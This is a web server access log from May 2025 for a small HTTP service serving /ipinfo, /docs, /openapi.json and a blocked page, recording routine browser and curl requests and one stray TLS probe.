188.162.1.161 - - [13/May/2025:14:51:32 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:51:33 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:51:40 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 ABB/3.7.3"
188.162.1.161 - - [13/May/2025:14:51:54 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:51:54 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:52:41 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:52:41 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:52:44 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:52:44 +0700] "GET /favicon.ico HTTP/1.1" 404 22 "http://212.164.112.190/" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:53:16 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:53:16 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:53:18 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
100.86.220.209 - - [13/May/2025:14:53:30 +0700] "GET /ipinfo HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:14:53:48 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:53:50 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:14:53:50 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
100.86.220.209 - - [13/May/2025:14:53:57 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:14:54:11 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
178.211.139.123 - - [13/May/2025:14:55:50 +0700] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.54 - - [13/May/2025:14:56:00 +0700] "GET / HTTP/1.1" 404 22 "-" "curl/7.81.0"
154.81.156.34 - - [13/May/2025:14:56:01 +0700] "GET / HTTP/1.1" 404 22 "-" "Hello World"
100.86.220.209 - - [13/May/2025:14:58:41 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:15:00:51 +0700] "GET / HTTP/1.1" 302 145 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:15:01:30 +0700] "GET / HTTP/1.1" 302 145 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:15:03:48 +0700] "GET /ipinfo HTTP/1.1" 200 65 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:15:03:59 +0700] "GET /ipinfo HTTP/1.1" 200 65 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:15:04:12 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "curl/8.11.0"
100.86.220.209 - - [13/May/2025:15:05:09 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:15:05:17 +0700] "GET /blocked.html HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:15:05:27 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:15:05:36 +0700] "GET /ipinfo HTTP/1.1" 200 169 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:15:05:36 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/ipinfo" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:15:05:41 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
100.86.220.209 - - [13/May/2025:15:05:49 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
100.86.220.209 - - [13/May/2025:15:06:12 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:15:06:24 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
212.164.112.190 - - [13/May/2025:15:10:10 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
212.164.112.190 - - [13/May/2025:15:10:37 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.1.161 - - [13/May/2025:15:10:40 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:15:10:40 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
188.162.1.161 - - [13/May/2025:15:10:40 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/blocked.html" "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.113 Mobile Safari/537.36"
212.164.112.190 - - [13/May/2025:15:11:20 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
51.158.200.87 - - [13/May/2025:15:11:39 +0700] "GET /docs HTTP/1.1" 200 937 "-" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
51.158.200.87 - - [13/May/2025:15:11:41 +0700] "GET /openapi.json HTTP/1.1" 200 1658 "http://212.164.112.190/docs" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
51.158.200.87 - - [13/May/2025:15:12:52 +0700] "GET /docs HTTP/1.1" 200 937 "-" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
51.158.200.87 - - [13/May/2025:15:12:53 +0700] "GET /openapi.json HTTP/1.1" 200 1658 "http://212.164.112.190/docs" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
212.164.112.190 - - [13/May/2025:15:14:10 +0700] "GET /ipinfo HTTP/1.1" 200 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
188.162.13.251 - - [13/May/2025:15:15:25 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.13.251 - - [13/May/2025:15:15:25 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.13.251 - - [13/May/2025:15:15:25 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/blocked.html" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.13.251 - - [13/May/2025:15:15:30 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
188.162.13.251 - - [13/May/2025:15:15:30 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/blocked.html" "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36"
212.164.112.190 - - [13/May/2025:15:15:35 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
212.164.112.190 - - [13/May/2025:15:21:31 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
176.59.143.218 - - [13/May/2025:15:21:47 +0700] "GET / HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36"
176.59.143.218 - - [13/May/2025:15:21:47 +0700] "GET /blocked.html HTTP/1.1" 200 192 "-" "Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36"
176.59.143.218 - - [13/May/2025:15:21:48 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/blocked.html" "Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36"
154.81.156.34 - - [13/May/2025:15:24:04 +0700] "GET / HTTP/1.1" 404 22 "-" "Hello World"
212.164.112.190 - - [13/May/2025:19:32:56 +0700] "GET /docs HTTP/1.1" 302 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
212.164.112.190 - - [13/May/2025:19:32:56 +0700] "GET /favicon.ico HTTP/1.1" 302 145 "http://212.164.112.190/blocked.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0 (Edition Yx GX)"
93.174.93.12 - - [13/May/2025:19:33:04 +0700] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
